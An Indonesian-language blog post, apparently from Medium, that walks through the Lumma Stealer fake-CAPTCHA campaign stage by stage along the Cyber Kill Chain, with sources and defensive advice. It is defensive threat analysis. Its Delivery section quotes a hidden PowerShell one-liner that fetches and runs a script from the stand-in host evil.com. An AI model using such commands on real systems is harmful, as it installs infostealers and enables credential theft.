# Jebakan CAPTCHA Palsu: Bagaimana Lumma Stealer Menyusup dan Mencuri Data Anda

Bayangkan Anda sedang browsing santai, tiba-tiba muncul halaman verifikasi CAPTCHA yang familiar: “Klik jika Anda bukan robot.” Anda klik, ikuti instruksi sederhana seperti copy-paste perintah ke Windows Run, dan voila — malware sudah mengintai di balik layar. Ini bukan skenario fiksi, tapi taktik nyata dari Lumma Stealer, infostealer ganas yang menyebar lewat kampanye Fake CAPTCHA sejak Agustus 2024. Kampanye ini telah menargetkan ribuan korban global, dari pengguna biasa hingga organisasi pemerintahan di AS, Kanada, dan Eropa.

Lumma Stealer, dijual sebagai Malware-as-a-Service (MaaS) di forum underground, telah terlibat dalam berbagai insiden besar. Menurut laporan Netskope Threat Labs (November 2024), kampanye Fake CAPTCHA melibatkan malvertising di situs kompromi, menjangkau korban di Argentina, AS, Filipina, dan lainnya — menginfeksi lebih dari 1.150 organisasi. NCC Group mendokumentasikan kasus di mana korban terinfeksi dalam hitungan menit setelah mengunjungi situs palsu. Microsoft Threat Intelligence (Mei 2025) melaporkan kampanye email massal ke Kanada dengan invoice palsu yang mengarah ke Traffic Direction System (TDS), sementara Qualys TRU (Oktober 2024) mengungkap penggunaan CDN seperti Cloudflare untuk hosting halaman CAPTCHA tiruan. Bahkan pemerintah AS via CIS (Maret 2025) memperingatkan serangan terhadap entitas SLTT (State, Local, Tribal, Territorial) menggunakan TDS dan iklan berbahaya. Data curian — credential browser, wallet crypto, 2FA — dijual di forum seperti Leaky.pro, mendanai operasi cybercrime lebih lanjut.

Kampanye ini cerdik karena memanfaatkan ClickFix social engineering: korban secara sukarela menjalankan PowerShell obfuscated, melewati deteksi browser. Tapi bagaimana alur lengkapnya? Mari kita bedah menggunakan Cyber Kill Chain framework dari Lockheed Martin — 7 tahap yang memetakan serangan dari reconnaissance hingga pencapaian tujuan. Ini membantu kita pahami di mana harus bertahan.

## 1. Reconnaissance (Pengintaian)

Attacker memindai target potensial. Mereka gunakan Traffic Distribution Systems (TDS) seperti Prometheus untuk filter bot dan geolokasi korban manusia (misalnya, wilayah AS, Asia, Eropa). Situs kompromi atau malvertising diadakan via SEO poisoning, iklan berbayar, atau kompromi situs dewasa/marketplace. Laporan Netskope sebut 260 domain unik menyebar 5.000 PDF phishing, sementara Microsoft catat ribuan email invoice palsu ke Kanada (April 2025). Tujuannya: identifikasi korban rentan seperti gamer atau pencari cracked software.

## 2. Weaponization (Penyenarmataan)

Malware Lumma dikemas ulang dengan loader obfuscated (EXE, DLL, PowerShell). Halaman Fake CAPTCHA dibuat dengan JavaScript yang embed Base64-encoded script, XOR-encrypted untuk AMSI bypass (anti-malware Windows). Qualys laporkan fungsi ‘verify’ yang copy script ke clipboard; Netskope tambah snippet open-source untuk evasi. Payload akhir: Lumma Stealer dengan config C2 dinamis (.shop TLD atau blameaowi.run).

## 3. Delivery (Pengiriman)

Vektor utama: redirect ke Fake CAPTCHA via malvertising, situs kompromi, atau phishing (email/Discord/GitHub). Korban klik “I’m not robot”, lalu instruksi: Win+R, paste command seperti :

`powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString(‘http://evil.com/stage.ps1')`

Ini download stager (misalnya AF1.exe atau dengo.zip), hindari unduhan browser. Timeline NCC: T+0 menit situs CAPTCHA, T+1 PowerShell jalan.

## 4. Exploitation (Eksploitasi)

Tidak ada exploit zero-day; ini user execution (T1204 MITRE). Korban jalankan script via Run dialog, trigger mshta.exe atau PowerShell untuk injeksi. Loader gunakan process hollowing (ganti BitLockerToGo.exe) atau DLL side-loading. Evasi: AMSI bypass, obfuscation berlapis. Dalam 2 menit, koneksi C2 aktif (HTTPS ke blameaowi.run).

## 5. Installation (Instalasi)

Stager drop Lumma binary (misalnya VectirFree.exe), persistensi via registry (MRUList) atau scheduled task. Fileless sebanyak mungkin untuk stealth. Sistem info (System.txt), screenshot (Screen.png), dan folder staging dibuat. Trend Micro catat overlap dengan Stargazer Goblin yang abuse GitHub untuk persistence.

## 6. Command and Control (Kontrol & Komando)

Lumma hubungi C2 via HTTP POST (User-Agent: TeslaBrowser/5.5). Config di-fetch untuk target spesifik (browser seperti Chrome/Firefox, wallet MetaMask, 2FA). Data dienkripsi lalu exfil ke Telegram API atau server tersembunyi. ESET sebut Lumma adaptif, rotate domain cepat pasca-takedown Mei 2025.

## 7. Actions on Objectives (Aksi pada Tujuan)

Pencurian data: Ambil credential, cookie, autofill, crypto wallet, 2FA seed. File dari Downloads/Documents/Desktop dicuri. Data dikirim per batch, screenshot cek sandbox. Tujuan akhir: jual log di dark web untuk phishing lanjutan, ransomware, atau akses finansial. Dampak: kerugian finansial massal, seperti kampanye Booking.com (Maret 2025).
Learn about Medium’s values

Kampanye Fake CAPTCHA ini menonjol karena evolusinya — dari spam sederhana ke social engineering canggih, tahan takedown (Microsoft lead aksi global Mei 2025, tapi Lumma bangkit cepat). Pelajaran utama? Lindungi diri: Update software, gunakan DNS filtering (blok C2), monitor PowerShell aneh, dan edukasi user hindari “verifikasi” mencurigakan. Endpoint detection seperti EDR bisa tangkap T+1 menit execution.

Lumma bukan akhir; ini tren infostealer MaaS yang murah dan efektif. Dengan pemahaman Kill Chain ini, kita bisa potong rantai di tahap awal — sebelum data Anda jadi “loot” berikutnya. Stay vigilant!

### Source :
1. Microsoft Security Blog (Mei 2025): Lumma Stealer delivery techniques, email campaign Kanada.
https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/

2. NCC Group Research Blog (November 2025): Fake CAPTCHA incident timeline, PowerShell execution.
https://www.nccgroup.com/research-blog/fake-captcha-led-to-lumma/

3. Netskope Threat Labs (November 2024): Fake CAPTCHA campaigns global, evasion techniques.
https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection

4. Qualys Blog (Oktober 2024): Unmasking Lumma via Fake CAPTCHA, multi-stage fileless.
https://blog.qualys.com/vulnerabilities-threat-research/2024/10/20/unmasking-lumma-stealer-analyzing-deceptive-tactics-with-fake-captcha

5. The Hacker News (Januari 2025): Global Fake CAPTCHA spreading Lumma.
https://thehackernews.com/2025/01/beware-fake-captcha-campaign-spreads.html

6. CISecurity Blog (Maret 2025): Lumma campaign impacting US SLTT governments.
https://www.cisecurity.org/insights/blog/active-lumma-stealer-campaign-impacting-us-sltts

7. Trend Micro Research (Januari 2025): GitHub-based Lumma delivery (kontekstual).
https://www.trendmicro.com/en/research/25/a/lumma-stealers-github-based-delivery-via-mdr.html

8. ESET Blog (Januari 2025): Lumma growth, multi-vector incl. Fake CAPTCHA.
https://www.eset.com/blog/en/business-topics/threat-landscape/lumma-stealer-threat/

9. CloudSek Blog (Agustus 2025): Lumma exploits Fake CAPTCHA pages.
https://www.cloudsek.com/blog/unmasking-the-danger-lumma-stealer-malware-exploits-fake-captcha-pages

10. Infostealers.com (Agustus 2024): Anatomy of Lumma attack via Fake CAPTCHA.
https://www.infostealers.com/article/anatomy-of-a-lumma-stealer-attack-via-fake-captcha-pages/
